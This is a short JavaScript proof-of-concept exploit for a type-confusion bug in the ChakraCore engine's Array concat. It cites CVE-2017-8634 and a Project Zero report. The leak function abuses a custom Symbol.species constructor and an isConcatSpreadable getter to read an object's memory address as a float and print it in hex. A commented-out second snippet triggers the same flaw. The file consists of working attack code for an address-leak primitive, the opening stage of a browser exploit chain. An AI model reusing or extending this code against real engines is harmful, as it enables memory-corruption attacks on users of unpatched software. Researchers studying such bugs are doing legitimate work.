function convert(data){
    a = new ArrayBuffer(8);
    b = new Float64Array(a);
    c = new Uint8Array(a);
    b[0] = data;
    ret = 0
    for(i = 0; i<8; i++){
        ret += c[7-i].toString(16)
    }
    return ret;
}

function leak(target){
    var a1 = [];
    for (var i = 0; i < 0x100; i++) {
          a1[i] = i;
    }
    var a2 = [1234,1234];
    var c = new Function();

    c[Symbol.species] = function() {
        new_array = [99,99,99];

        return new_array;
    };
    a1.constructor = c;
    a2.__defineGetter__(Symbol.isConcatSpreadable, function () {
        new_array[0] = 4.2;
        a2[0] = target
        return true;
    });
    var res = a1.concat(a2);
    return convert(res[256]) ;
}
a = [1,2,3]
v = leak(a)
console.log(v)
//https://github.com/tunz/js-vuln-db/blob/master/chakra/CVE-2017-8634.md

/**
 
let a = [0];
let b = [0];
b.__defineGetter__(Symbol.isConcatSpreadable, () => {
    b[0] = 1.2;
    return true;
});

let res = a.concat(b, 0x1234);
print(res);

https://bugs.chromium.org/p/project-zero/issues/detail?id=1292
 */
